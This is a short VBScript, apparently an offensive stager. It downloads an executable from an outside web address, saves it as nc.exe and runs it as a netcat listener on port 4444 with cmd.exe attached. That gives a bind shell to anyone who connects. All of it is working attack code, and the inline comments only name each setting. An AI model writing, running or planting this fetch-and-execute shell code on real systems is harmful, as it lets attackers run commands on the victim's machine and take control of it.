dim http_obj
dim stream_obj
dim shell_obj
 
set http_obj = CreateObject("Microsoft.XMLHTTP")
set stream_obj = CreateObject("ADODB.Stream")
set shell_obj = CreateObject("WScript.Shell")
 
URL = "http://www.mikemurr.com/example.exe" 'Where to download the file from
FILENAME = "nc.exe" 'Name to save the file (on the local system)
RUNCMD = "nc.exe -L -p 4444 -e cmd.exe" 'Command to run after downloading
 
http_obj.open "GET", URL, False
http_obj.send
 
stream_obj.type = 1
stream_obj.open
stream_obj.write http_obj.responseBody
stream_obj.savetofile FILENAME, 2
shell_obj.run RUNCMD